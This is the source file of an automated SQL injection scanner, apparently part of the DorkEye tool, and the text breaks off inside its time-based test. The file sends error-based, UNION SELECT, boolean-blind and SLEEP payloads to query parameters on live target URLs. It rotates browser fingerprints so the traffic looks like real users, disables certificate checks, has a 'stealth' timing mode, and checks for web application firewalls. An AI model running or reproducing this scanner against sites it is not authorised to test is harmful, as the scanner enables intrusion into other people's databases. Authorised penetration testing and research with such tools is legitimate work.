"""
DorkEye SQLi Detector — Tools/sqli_detector.py
═══════════════════════════════════════════════════════════════
Multi-method SQL injection engine extracted from DorkEye v4.9

Contains:
  - SQLiConfidence         enum
  - HTTPFingerprint        dataclass
  - load_http_fingerprints / resolve_reference / resolve_accept_language
  - USER_AGENTS
  - HTTPFingerprintRotator
  - CircuitBreaker
  - _ScriptStripper / _strip_script_tags
  - WAF_SIGNATURES
  - _HIGH_PRIORITY_PARAMS / _MEDIUM_PRIORITY_PARAMS
  - SQLiDetector           (main class)

Interrupt flags (_exit_requested, _skip_current) are module-level
booleans.  dorkeye.py's SIGINT handler propagates its own flags here
after each Ctrl+C so in-flight requests are aborted correctly.

Author: xPloits3c I.C.W.T | https://github.com/xPloits3c/DorkEye
"""

import os
import re
import sys
import time
import json
import random
import difflib
import statistics
import threading
from dataclasses import dataclass
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse, parse_qs, urlencode
from html.parser import HTMLParser as _HTMLParser

import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Interrupt flags — mirrored from dorkeye.py signal handler ────────────────
# dorkeye.py sets these after every Ctrl+C so in-flight requests abort cleanly.
_exit_requested: bool = False
_skip_current:   bool = False


# ══════════════════════════════════════════════════════════════
#  Termux / Android auto-detection
# ══════════════════════════════════════════════════════════════

def _detect_termux() -> bool:
    """Return True when running inside Termux on Android."""
    return (
        "TERMUX_VERSION" in os.environ
        or os.environ.get("PREFIX", "").startswith("/data/data/com.termux")
        or os.path.isdir("/data/data/com.termux")
    )

TERMUX_IS_ANDROID: bool = _detect_termux()


# ══════════════════════════════════════════════════════════════
#  Interruptible sleep
# ══════════════════════════════════════════════════════════════

def _interruptible_sleep(seconds: float, step: float = 0.25) -> None:
    """Sleep in small steps; return immediately if an interrupt flag is set."""
    elapsed = 0.0
    while elapsed < seconds:
        if _exit_requested or _skip_current:
            return
        time.sleep(min(step, seconds - elapsed))
        elapsed += step


# ══════════════════════════════════════════════════════════════
#  SQLiConfidence
# ══════════════════════════════════════════════════════════════

class SQLiConfidence(Enum):
    """Confidence levels for SQL injection findings (none → low → medium → high → critical)."""
    NONE     = "none"
    LOW      = "low"
    MEDIUM   = "medium"
    HIGH     = "high"
    CRITICAL = "critical"


# ══════════════════════════════════════════════════════════════
#  HTTPFingerprint dataclass
# ══════════════════════════════════════════════════════════════

@dataclass
class HTTPFingerprint:
    """Immutable snapshot of a browser HTTP fingerprint used to build realistic request headers."""
    browser:         str
    os:              str
    user_agent:      str
    accept_language: str
    accept_encoding: str
    accept:          str
    referer:         str
    sec_fetch_dest:  str
    sec_fetch_mode:  str
    sec_fetch_site:  str
    cache_control:   str


# ══════════════════════════════════════════════════════════════
#  HTTP Fingerprinting helpers
# ══════════════════════════════════════════════════════════════

def load_http_fingerprints() -> Dict:
    """Load http_fingerprints.json and return a dict tagged with _mode (legacy | advanced | disabled).

    Looks for the file in the parent directory of this module (the DorkEye
    root), matching the original behaviour.
    """
    # Tools/ is one level below the DorkEye root, so go up one directory.
    fingerprint_file = Path(__file__).parent.parent / "http_fingerprints.json"
    try:
        with open(fingerprint_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        if not isinstance(data, dict) or not data:
            raise ValueError("Fingerprint file is empty or invalid")
        if "fingerprints" in data:
            return {
                "_mode":             "advanced",
                "_meta":             data.get("_meta", {}),
                "fingerprints":      data.get("fingerprints", {}),
                "language_profiles": data.get("language_profiles", {}),
                "common_headers":    data.get("common_headers", {})
            }
        return {"_mode": "legacy", "fingerprints": data}
    except Exception as e:
        # Use stderr to avoid importing rich; dorkeye.py will print any
        # higher-level warning via its own console if needed.
        print(f"[sqli_detector] Warning: failed to load HTTP fingerprints: {e}",
              file=sys.stderr)
        print("[sqli_detector] HTTP fingerprinting will be disabled", file=sys.stderr)
        return {"_mode": "disabled"}


def resolve_reference(value: str, common_headers: Dict) -> str:
    """Resolve a @reference token to its value in common_headers, or return value unchanged."""
    if isinstance(value, str) and value.startswith("@"):
        key = value[1:]
        return common_headers.get(key, "")
    return value


def resolve_accept_language(fp_headers: Dict, language_profiles: Dict) -> str:
    """Pick a random language profile from fp_headers and return the matching Accept-Language string."""
    profiles = fp_headers.get("accept_language_profiles")
    if not profiles:
        return ""
    profile = random.choice(profiles)
    return language_profiles.get(profile, "")


# ══════════════════════════════════════════════════════════════
#  User-Agent pool
# ══════════════════════════════════════════════════════════════

USER_AGENTS: Dict[str, List[str]] = {
    "chrome": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ],
    "firefox": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0"
    ],
    "safari": [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
    ],
    "edge": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
    ]
}


# ══════════════════════════════════════════════════════════════
#  HTTPFingerprintRotator
# ══════════════════════════════════════════════════════════════

class HTTPFingerprintRotator:
    """
Rotates browser fingerprint profiles on every request to make traffic look like real users.

    Supports two JSON schema modes:
      legacy   — flat dict of fingerprint objects
      advanced — shared header references + language profiles

"""
    def __init__(self):
        """Load raw fingerprints from JSON and build the fingerprint list."""
        self.raw_fingerprints    = load_http_fingerprints()
        self.fingerprints        = self._build_fingerprints()
        self.current_index       = 0
        self.current_fingerprint = None

    def _build_fingerprints(self) -> List[HTTPFingerprint]:
        """Parse raw fingerprint data into a list of HTTPFingerprint dataclass instances."""
        fingerprints: List[HTTPFingerprint] = []
        mode = self.raw_fingerprints.get("_mode")

        if mode == "legacy":
            for fp_data in self.raw_fingerprints.get("fingerprints", {}).values():
                try:
                    fingerprints.append(HTTPFingerprint(
                        browser         = fp_data["browser"],
                        os              = fp_data["os"],
                        user_agent      = fp_data["user_agent"],
                        accept_language = fp_data["accept_language"],
                        accept_encoding = fp_data["accept_encoding"],
                        accept          = fp_data["accept"],
                        referer         = "",
                        sec_fetch_dest  = fp_data["sec_fetch_dest"],
                        sec_fetch_mode  = fp_data["sec_fetch_mode"],
                        sec_fetch_site  = fp_data["sec_fetch_site"],
                        cache_control   = fp_data["cache_control"],
                    ))
                except KeyError:
                    continue
            return fingerprints

        if mode == "advanced":
            language_profiles = self.raw_fingerprints.get("language_profiles", {})
            common_headers    = self.raw_fingerprints.get("common_headers", {})
            fps               = self.raw_fingerprints.get("fingerprints", {})
            for fp in fps.values():
                try:
                    headers   = fp.get("headers", {})
                    sec_fetch = headers.get("sec_fetch", {})
                    fingerprints.append(HTTPFingerprint(
                        browser         = fp.get("browser", ""),
                        os              = fp.get("os", ""),
                        user_agent      = fp.get("user_agent", ""),
                        accept_language = resolve_accept_language(headers, language_profiles),
                        accept_encoding = resolve_reference(headers.get("accept_encoding", ""), common_headers),
                        accept          = resolve_reference(headers.get("accept", ""), common_headers),
                        referer         = "",
                        sec_fetch_dest  = sec_fetch.get("dest", "document"),
                        sec_fetch_mode  = sec_fetch.get("mode", "navigate"),
                        sec_fetch_site  = sec_fetch.get("site", "none"),
                        cache_control   = resolve_reference(headers.get("cache_control", ""), common_headers),
                    ))
                except Exception:
                    continue

        return fingerprints

    def get_random(self) -> Optional[HTTPFingerprint]:
        """Select and store a random fingerprint from the pool; return it."""
        self.current_fingerprint = random.choice(self.fingerprints) if self.fingerprints else None
        return self.current_fingerprint

    def get_next(self) -> Optional[HTTPFingerprint]:
        """Select and store the next fingerprint in round-robin order; return it."""
        if not self.fingerprints:
            return None
        self.current_fingerprint = self.fingerprints[self.current_index]
        self.current_index       = (self.current_index + 1) % len(self.fingerprints)
        return self.current_fingerprint

    def build_headers(self, referer: str = "") -> Dict[str, str]:
        """Build and return an HTTP headers dict from the current fingerprint. Adds Referer if provided."""
        if not self.current_fingerprint:
            return {"User-Agent": "Mozilla/5.0", "Accept": "*/*", "Connection": "keep-alive"}
        headers = {
            "User-Agent":                self.current_fingerprint.user_agent,
            "Accept":                    self.current_fingerprint.accept,
            "Accept-Language":           self.current_fingerprint.accept_language,
            "Accept-Encoding":           self.current_fingerprint.accept_encoding,
            "Sec-Fetch-Dest":            self.current_fingerprint.sec_fetch_dest,
            "Sec-Fetch-Mode":            self.current_fingerprint.sec_fetch_mode,
            "Sec-Fetch-Site":            self.current_fingerprint.sec_fetch_site,
            "Cache-Control":             self.current_fingerprint.cache_control,
            "Pragma":                    "no-cache",
            "DNT":                       "1",
            "Connection":                "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        if referer:
            headers["Referer"] = referer
        return headers


# ══════════════════════════════════════════════════════════════
#  CircuitBreaker
# ══════════════════════════════════════════════════════════════

class CircuitBreaker:
    """Tracks unreachable hosts and short-circuits further requests to them within a session."""
    def __init__(self):
        """Initialise with an empty dead-host set."""
        self._dead: Set[str] = set()

    def _key(self, url: str) -> str:
        """Return the scheme+netloc key for the given URL (host-level granularity)."""
        p = urlparse(url)
        return f"{p.scheme}://{p.netloc}"

    def is_dead(self, url: str) -> bool:
        """Return True if the host of url has been marked dead."""
        return self._key(url) in self._dead

    def mark_dead(self, url: str) -> None:
        """Mark the host of url as dead so future requests are skipped immediately."""
        self._dead.add(self._key(url))

    def reset(self) -> None:
        """Clear the dead-host set, re-enabling all hosts."""
        self._dead.clear()


# ══════════════════════════════════════════════════════════════
#  HTMLParser-based script-tag stripper
#  (CWE-20/116/185/186 fix — replaces the original regex approach)
# ══════════════════════════════════════════════════════════════

class _ScriptStripper(_HTMLParser):
    """HTMLParser subclass that removes every <script>…</script> block."""

    def __init__(self):
        """Initialise state: script depth counter and text-part accumulator."""
        super().__init__(convert_charrefs=False)
        self._in_script: int = 0
        self._parts: list   = []

    def handle_starttag(self, tag, attrs):
        """Increment the nesting counter when a <script> opening tag is encountered."""
        if tag.lower() == "script":
            self._in_script += 1

    def handle_endtag(self, tag):
        """Decrement the nesting counter when a </script> closing tag is encountered."""
        if tag.lower() == "script" and self._in_script:
            self._in_script -= 1

    def handle_data(self, data):
        """Append text to the result only when not inside a <script> block."""
        if not self._in_script:
            self._parts.append(data)

    def handle_entityref(self, name):
        """Append HTML entity references (&name;) when not inside a <script> block."""
        if not self._in_script:
            self._parts.append(f"&{name};")

    def handle_charref(self, name):
        """Append numeric character references (&#N;) when not inside a <script> block."""
        if not self._in_script:
            self._parts.append(f"&#{name};")

    def get_result(self) -> str:
        """Return the accumulated clean text with all <script> blocks removed."""
        return "".join(self._parts)


# Fallback-only regex (used when the HTML parser itself raises an exception).
_SCRIPT_TAG_RE_FALLBACK = re.compile(
    r"<script(?:[^>]*)>[\s\S]*?</script\s*>", re.IGNORECASE
)


def _strip_script_tags(body: str) -> str:
    """Return body with all <script> blocks removed.

    Uses the built-in HTMLParser as the primary implementation to
    correctly handle all valid (and many invalid) HTML closing-tag
    variants that a regex cannot reliably cover.
    """
    stripper = _ScriptStripper()
    try:
        stripper.feed(body)
        stripper.close()
        return stripper.get_result()
    except Exception:
        return _SCRIPT_TAG_RE_FALLBACK.sub("", body)


# ══════════════════════════════════════════════════════════════
#  WAF detection signatures
# ══════════════════════════════════════════════════════════════

WAF_SIGNATURES: Dict[str, List[str]] = {
    "cloudflare":  ["cf-ray", "__cfduid", "cloudflare", "attention required! | cloudflare"],
    "modsecurity": ["mod_security", "modsecurity", "406 not acceptable", "not acceptable!"],
    "wordfence":   ["wordfence", "generated by wordfence"],
    "sucuri":      ["x-sucuri-id", "sucuri website firewall", "access denied - sucuri"],
    "imperva":     ["x-iinfo", "incapsula incident", "_incap_ses_"],
    "akamai":      ["akamai", "x-akamai-transformed", "reference #18"],
    "f5_bigip":    ["x-waf-event-info", "bigipserver", "the requested url was rejected"],
    "barracuda":   ["barra_counter_session", "barracuda"],
    "fortiweb":    ["fortigate", "fortiweb"],
    "aws_waf":     ["x-amzn-requestid", "awselb", "forbidden - aws waf"],
    "denyall":     ["denyall", "x-denyall"],
    "reblaze":     ["x-reblaze-protection"],
}


# ══════════════════════════════════════════════════════════════
#  Parameter priority tables
# ══════════════════════════════════════════════════════════════

_HIGH_PRIORITY_PARAMS: frozenset = frozenset({
    "id", "pid", "uid", "nid", "tid", "cid", "rid", "eid", "fid", "gid",
    "page", "pg", "p", "num", "item", "product", "prod", "article",
    "cat", "category", "sort", "order", "by", "type", "idx", "index",
    "ref", "record", "row", "entry", "post", "news", "view",
})

_MEDIUM_PRIORITY_PARAMS: frozenset = frozenset({
    "search", "q", "query", "s", "keyword", "kw", "term", "find",
    "name", "user", "username", "login", "email", "mail",
    "city", "country", "region", "lang", "language",
    "filter", "tag", "label", "topic", "subject", "section",
})


# ══════════════════════════════════════════════════════════════
#  SQLiDetector — timing constants (Termux-aware)
# ══════════════════════════════════════════════════════════════

_CONNECT_TIMEOUT  = 3 if TERMUX_IS_ANDROID else 4
_DEFAULT_READ     = 6 if TERMUX_IS_ANDROID else 8
_TIMEBASED_MARGIN = 2.5
_SLEEP_DELAY      = 3
_BASELINE_SAMPLES = 1 if TERMUX_IS_ANDROID else 2
_MAX_BASELINE_S   = 6.0

_PROBE_SAMPLES       = 2 if TERMUX_IS_ANDROID else 3
_PROBE_NOISE_BUFFER  = 0.04
_PROBE_MAX_THRESHOLD = 0.18
_BOOL_SAMPLES        = 2 if TERMUX_IS_ANDROID else 3
_TIMEBASED_CONFIRM   = 1 if TERMUX_IS_ANDROID else 2
_UNION_COLUMNS_MAX   = 5


# ══════════════════════════════════════════════════════════════
#  SQLiDetector
# ══════════════════════════════════════════════════════════════

class SQLiDetector:
    """
Multi-method SQL injection detector that tests GET/POST/JSON/path parameters.

    Detection methods (run in order per parameter):
      1. error_based      — injects payloads that trigger DB error signatures
      2. union_based      — probes column count and detects UNION response anomalies
      3. boolean_blind    — compares response sizes for true/false condition pairs
      4. time_based_blind — measures SLEEP()-induced response delays

    Parameters are prioritised by attack surface before testing:
      high   — numeric values or known high-risk names (id, page, cat, …)
      medium — search/filter names (q, search, lang, …)
      low    — everything else

    A CircuitBreaker skips further requests to hosts that became unreachable.

"""

    SQL_ERROR_SIGNATURES = {
        "mysql": [
            r"You have an error in your SQL syntax",
            r"Warning.*mysqli?_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"mysql_num_rows\(\)",
            r"mysql_fetch_(?:array|assoc|row|object)",
            r"MySQL server version for the right syntax",
            r"com\.mysql\.jdbc\.exceptions",
        ],
        "postgresql": [
            r"PostgreSQL.*ERROR",
            r"Warning.*\bpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
            r"ERROR:\s+unterminated quoted string",
        ],
        "mssql": [
            r"Driver.*SQL[\-\_\ ]*Server",
            r"OLE DB.*SQL Server",
            r"SQLServer JDBC Driver",
            r"Microsoft SQL Native Client error",
            r"ODBC SQL Server Driver",
            r"Unclosed quotation mark after the character string",
            r"Microsoft OLE DB Provider for SQL Server",
            r"\[Microsoft\]\[ODBC SQL Server Driver\]",
            r"Incorrect syntax near",
        ],
        "sqlite": [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"sqlite3\.OperationalError:",
            r"near \".*\": syntax error",
        ],
        "oracle": [
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\boci_",
            r"ORA-\d{5}",
            r"oracle\.jdbc\.driver",
            r"quoted string not properly terminated",
        ],
    }

    _UNION_COL_MISMATCH_RE = re.compile(
        r"(The used SELECT statements have a different number of columns"
        r"|each UNION query must have the same number of columns"
        r"|SELECTs to the left and right of UNION do not have the same number"
        r"|ORA-01789"
        r"|column count doesn.t match)",
        re.IGNORECASE,
    )

    def __init__(self, stealth: bool = False, timeout: int = _DEFAULT_READ):
        """Initialise the detector with stealth flag, timeout, fingerprint rotator, and circuit breaker."""
        self.stealth             = stealth
        self.read_timeout        = timeout
        self.circuit_breaker     = CircuitBreaker()
        self.fingerprint_rotator = HTTPFingerprintRotator()
        self._session            = self._build_session()
        self._status_cb          = None  # optional callable — receives phase strings for the progress bar

    def _cb(self, msg: str) -> None:
        """Send a phase/status message to the registered callback (no-op if not set)."""
        if callable(self._status_cb):
            try:
                self._status_cb(msg)
            except Exception:
                pass

    def _build_session(self) -> requests.Session:
        """Build and return a requests.Session with a retry adapter (backoff on 429/5xx)."""
        session = requests.Session()
        retry   = Retry(
            total            = 2,
            backoff_factor   = 0.5,
            status_forcelist = [429, 500, 502, 503, 504],
            allowed_methods  = ["GET"],
            raise_on_status  = False,
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://",  adapter)
        session.mount("https://", adapter)
        return session

    def _timeout(self, extra_read: float = 0) -> Tuple[int, float]:
        """Return a (connect_timeout, read_timeout + extra_read) tuple for use in requests calls."""
        return (_CONNECT_TIMEOUT, self.read_timeout + extra_read)

    def _run_interruptible(self, fn, total_timeout: float, on_connect_error=None):
        """
    Run fn() in a daemon thread; return its result or None on timeout or interrupt.

            Args:
                fn:               Zero-argument callable that performs the HTTP request.
                total_timeout:    Wall-clock deadline in seconds.
                on_connect_error: Optional callback invoked when a connection-level exception fires.

    """
        _POLL         = 0.1
        result_holder = [None]
        exc_holder    = [None]
        done_event    = threading.Event()

        def _worker():
            """Worker thread: call fn() and store result or exception, then set done_event."""
            try:
                result_holder[0] = fn()
            except (requests.exceptions.ConnectTimeout,
                    requests.exceptions.ConnectionError) as e:
                exc_holder[0] = e
            except Exception:
                pass
            finally:
                done_event.set()

        threading.Thread(target=_worker, daemon=True).start()

        deadline = total_timeout + 1.0
        elapsed  = 0.0
        while elapsed < deadline:
            if _exit_requested or _skip_current:
                return None
            if done_event.wait(timeout=_POLL):
                if exc_holder[0] is not None and on_connect_error:
                    on_connect_error()
                return result_holder[0]
            elapsed += _POLL

        return None

    def _get(self, url: str, extra_read: float = 0) -> Optional[requests.Response]:
        """Perform a GET request with the current fingerprint; return the Response or None on failure."""
        if self.circuit_breaker.is_dead(url):
            return None

        self.fingerprint_rotator.get_random()
        headers = self.fingerprint_rotator.build_headers()
        timeout = self._timeout(extra_read)

        def _do():
            """Execute the actual requests.get call inside the worker thread."""
            return self._session.get(
                url,
                headers         = headers,
                timeout         = timeout,
                verify          = False,
                allow_redirects = True,
            )

        total = _CONNECT_TIMEOUT + self.read_timeout + extra_read

        return self._run_interruptible(
            _do,
            total_timeout    = total,
            on_connect_error = lambda: self.circuit_breaker.mark_dead(url),
        )

    # ──────────────────────────────────────────────────────────
    #  WAF Detection
    # ──────────────────────────────────────────────────────────

    def _detect_waf(self, response: requests.Response) -> Optional[str]:
        """Scan response headers and body for known WAF signatures; return the WAF name or None."""
        headers_keys   = {k.lower() for k in response.headers}
        headers_values = " ".join(v.lower() for v in response.headers.values())
        body_snippet   = response.text[:2000].lower()

        for waf_name, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig in headers_keys or sig in headers_values or sig in body_snippet:
                    return waf_name

        if response.status_code in (403, 406, 419, 429) and len(response.text) < 600:
            return "generic_waf"

        return None

    def _measure_baseline_latency(self, url: str) -> Optional[float]:
        """Measure average response latency over _BASELINE_SAMPLES requests; return it or None."""
        times = []
        for _ in range(_BASELINE_SAMPLES):
            if self.circuit_breaker.is_dead(url):
                return None
            if _exit_requested or _skip_current:
                return None
            t0       = time.monotonic()
            response = self._get(url)
            elapsed  = time.monotonic() - t0
            if response is None:
                return None
            times.append(elapsed)
            _interruptible_sleep(0.3)
        baseline = sum(times) / len(times)
        if baseline > _MAX_BASELINE_S:
            return None
        return baseline

    def has_query_params(self, url: str) -> bool:
        """Return True if the URL contains at least one GET query parameter."""
        try:
            return bool(parse_qs(urlparse(url).query))
        except Exception:
            return False

    def _extract_query_params(self, url: str) -> Dict[str, str]:
        """Parse and return all GET query parameters as a flat {name: first_value} dict."""
        try:
            params = parse_qs(urlparse(url).query)
            return {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        except Exception:
            return {}

    def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
        """Return a copy of url with param_name replaced by payload. Preserves the URL fragment."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if param_name not in params:
            return url
        params[param_name] = [payload]
        new_query = urlencode(params, doseq=True)
        rebuilt = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        if parsed.fragment:
            rebuilt += f"#{parsed.fragment}"
        return rebuilt

    def _get_baseline_response(self, url: str) -> Optional[Tuple[int, str, int]]:
        """Fetch the baseline response for url; return (status_code, body_text, body_len) or None."""
        response = self._get(url)
        if response is None:
            return None
        return (response.status_code, response.text, len(response.text))

    def _match_sql_errors(self, body: str) -> Optional[Tuple[str, str]]:
        """Strip <script> blocks then scan the body for SQL error signatures; return (db, pattern) or None."""
        clean_body = _strip_script_tags(body)
        for db_type, patterns in self.SQL_ERROR_SIGNATURES.items():
            for pattern in patterns:
                if re.search(pattern, clean_body, re.IGNORECASE):
                    return (db_type, pattern)
        return None

    # ──────────────────────────────────────────────────────────
    #  Parameter prioritisation
    # ──────────────────────────────────────────────────────────

    def _prioritize_params(self, params: Dict[str, str]) -> List[str]:
        """Sort params into high / medium / low priority lists and return them concatenated."""
        high:   List[str] = []
        medium: List[str] = []
        low:    List[str] = []

        for param, value in params.items():
            p_lower = param.lower()
            if value.isdigit() or p_lower in _HIGH_PRIORITY_PARAMS:
                high.append(param)
            elif p_lower in _MEDIUM_PRIORITY_PARAMS:
                medium.append(param)
            else:
                low.append(param)

        return high + medium + low

    def _probe_parameter(self, url: str, param_name: str, baseline_content: str) -> bool:
        """
    Return True if the parameter shows meaningful response variation when injected with a quote.

            Measures natural noise first, then checks whether the 1-quote payload pushes the
            response delta above the adaptive threshold derived from that noise.

    """
        if self.circuit_breaker.is_dead(url):
            return False

        r_init = self._get(url)
        if r_init is None:
            return False
        baseline_status: int       = r_init.status_code
        first_sim                  = difflib.SequenceMatcher(None, baseline_content, r_init.text).ratio()
        noise_samples: List[float] = [1.0 - first_sim]

        for _ in range(_PROBE_SAMPLES - 1):
            if _exit_requested or _skip_current:
                return False
            r = self._get(url)
            if r is None:
                return False
            sim = difflib.SequenceMatcher(None, baseline_content, r.text).ratio()
            noise_samples.append(1.0 - sim)
            _interruptible_sleep(0.2)

        noise_level = statistics.median(noise_samples)

        if noise_level > _PROBE_MAX_THRESHOLD:
            return False

        adaptive_threshold = noise_level + _PROBE_NOISE_BUFFER

        if _exit_requested or _skip_current:
            return False

        test_url  = self._inject_payload(url, param_name, "1'")
        r_payload = self._get(test_url)
        if r_payload is None:
            return False

        if r_payload.status_code != baseline_status:
            return False

        payload_noise = 1.0 - difflib.SequenceMatcher(
            None, baseline_content, r_payload.text
        ).ratio()

        return payload_noise > adaptive_threshold

    def _test_error_based(self, url: str, param_name: str) -> Dict:
        """Inject error-based payloads and look for DB error signatures in the response body."""
        result = {
            "method":     "error_based",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
            "waf":        None,
        }
        payloads = [
            "1' AND extractvalue(0,concat(0x7e,'TEST',0x7e)) AND '1'='1",
            "1 AND 1=CAST(CONCAT(0x7e,'TEST',0x7e) as INT)",
            "1'; SELECT NULL#",
        ]
        for payload in payloads:
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            test_url = self._inject_payload(url, param_name, payload)
            response = self._get(test_url)
            if response is None:
                continue

            waf = self._detect_waf(response)
            if waf:
                result["waf"] = waf
                result["evidence"].append(f"WAF detected ({waf}): error-based skipped")
                break

            match = self._match_sql_errors(response.text)
            if match:
                db_type, pattern = match
                result["vulnerable"] = True
                result["confidence"] = SQLiConfidence.HIGH.value
                result["evidence"].append(
                    f"{db_type.upper()} error signature matched: {pattern[:60]}"
                )
                return result

            if self.stealth:
                _interruptible_sleep(random.uniform(1.5, 3))

        return result

    def _test_union_based(self, url: str, param_name: str, baseline_len: int) -> Dict:
        """Probe UNION SELECT column counts and look for mismatch errors or abnormal response sizes."""
        result = {
            "method":     "union_based",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
            "waf":        None,
        }

        mismatch_at: List[int] = []

        for n_cols in range(1, _UNION_COLUMNS_MAX + 1):
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            null_cols = ",".join(["NULL"] * n_cols)
            payloads = [
                f"' UNION SELECT {null_cols}--",
                f"' UNION SELECT {null_cols}#",
                f"-1 UNION SELECT {null_cols}--",
                f"0 UNION ALL SELECT {null_cols}--",
            ]

            for payload in payloads:
                if _exit_requested or _skip_current:
                    break

                test_url = self._inject_payload(url, param_name, payload)
                response = self._get(test_url)
                if response is None:
                    continue

                waf = self._detect_waf(response)
                if waf:
                    result["waf"] = waf
                    result["evidence"].append(
                        f"WAF detected ({waf}): UNION probe aborted at {n_cols} cols"
                    )
                    return result

                body = response.text

                if self._UNION_COL_MISMATCH_RE.search(body):
                    if n_cols not in mismatch_at:
                        mismatch_at.append(n_cols)
                        result["evidence"].append(
                            f"UNION col-mismatch at n={n_cols} — server processes UNION"
                        )
                    break

                sql_match = self._match_sql_errors(body)
                if sql_match:
                    db_type, pattern = sql_match
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.HIGH.value
                    result["evidence"].append(
                        f"UNION triggered {db_type.upper()} error at n={n_cols}: {pattern[:50]}"
                    )
                    return result

                len_diff = abs(len(body) - baseline_len)
                if (response.status_code == 200
                        and len_diff > baseline_len * 0.20
                        and (n_cols in mismatch_at or bool(mismatch_at))):
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.MEDIUM.value
                    result["evidence"].append(
                        f"UNION SELECT {n_cols} cols: response Δ={len_diff}B "
                        f"(prev mismatches at cols {mismatch_at})"
                    )
                    return result

                if self.stealth:
                    _interruptible_sleep(random.uniform(0.5, 1.5))

        if mismatch_at:
            result["vulnerable"] = True
            result["confidence"] = SQLiConfidence.LOW.value
            result["evidence"].append(
                f"UNION col-mismatch at col(s) {mismatch_at}: UNION syntax processed by server"
            )

        return result

    def _test_boolean_blind(self, url: str, param_name: str, baseline_len: int) -> Dict:
        """Send true/false boolean pairs and detect statistically significant response-size differences."""
        result = {
            "method":     "boolean_blind",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
        }

        bool_payloads = [
            ("1' AND '1'='1", "true"),
            ("1' AND '1'='2", "false"),
            ("1 AND 1=1",     "true"),
            ("1 AND 1=2",     "false"),
        ]

        true_groups:  List[List[int]] = []
        false_groups: List[List[int]] = []

        for payload, payload_type in bool_payloads:
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            test_url = self._inject_payload(url, param_name, payload)
            samples: List[int] = []

            for _ in range(_BOOL_SAMPLES):
                if _exit_requested or _skip_current:
                    break
                r = self._get(test_url)
                if r is not None:
                    samples.append(len(r.text))
                if self.stealth:
                    _interruptible_sleep(random.uniform(0.5, 1))

            if len(samples) >= 2:
                (true_groups if payload_type == "true" else false_groups).append(samples)

            if self.stealth:
                _interruptible_sleep(random.uniform(1, 2))

        if not true_groups or not false_groups:
            return result

        all_true  = [v for g in true_groups  for v in g]
        all_false = [v for g in false_groups for v in g]

        median_true  = statistics.median(all_true)
        median_false = statistics.median(all_false)
        diff         = abs(median_true - median_false)

        internal_variance_true  = max(all_true)  - min(all_true)
        internal_variance_false = max(all_false) - min(all_false)
        noise_ceiling           = baseline_len * 0.04

        if (diff > baseline_len * 0.15
                and internal_variance_true  < noise_ceiling
                and internal_variance_false < noise_ceiling):
            result["vulnerable"] = True
            result["confidence"] = SQLiConfidence.MEDIUM.value
            result["evidence"].append(
                f"Boolean median differential: TRUE={median_true:.0f}B  "
                f"FALSE={median_false:.0f}B  diff={diff:.0f}B  "
                f"variance_t={internal_variance_true:.0f}B  "
                f"variance_f={internal_variance_false:.0f}B"
            )

        return result

    def _test_time_based_blind(self, url: str, param_name: str) -> Dict:
        """Inject SLEEP payloads and detect delays above baseline + margin as time-based blind SQLi."""
        result = {
            "method":     "time_based_blind",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
        }

        baseline = self._measure_baseline_latency(url)
        if baseline is None:
            result["evidence"].append(
                "Skipped: host unreachable or baseline latency too high"
            )
            return result

        threshold  = baseline + _SLEEP_DELAY + _TIMEBASED_MARGIN
        extra_read = _SLEEP_DELAY + _TIMEBASED_MARGIN + 3

        sleep_payloads  = [
            f"1' AND SLEEP({_SLEEP_DELAY}) AND '1'='1",
            f"1 AND SLEEP({_SLEEP_DELAY})",
        ]
        neutral_payload = "1' AND '1'='1"

        for sleep_payload in sleep_payloads:
